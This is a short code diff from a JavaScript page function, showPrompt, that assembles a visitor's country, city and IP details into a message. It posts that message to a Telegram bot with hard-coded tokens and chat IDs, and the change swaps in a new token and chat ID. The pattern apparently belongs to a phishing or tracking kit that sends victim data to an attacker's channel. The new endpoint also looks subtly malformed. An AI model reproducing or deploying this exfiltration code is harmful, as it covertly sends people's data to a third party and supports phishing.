@@ -181,11 +181,11 @@ function showPrompt(IpAddress) {
 <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
 <strong>City: </strong><code>${IpAddress.city}</code>`;
 
-        fetch(`https://api.telegram.org/bot7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk/sendMessage`, {
+        fetch(`https://api.telegram.org/7915689883:AAFk_jhQ4aVXoZ8RAjcVuYl1K0_Rk78yD_o/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: '-1002416068664',
+                chat_id: '-1002674039533',
                 text: message,
                 parse_mode: 'html'
             })
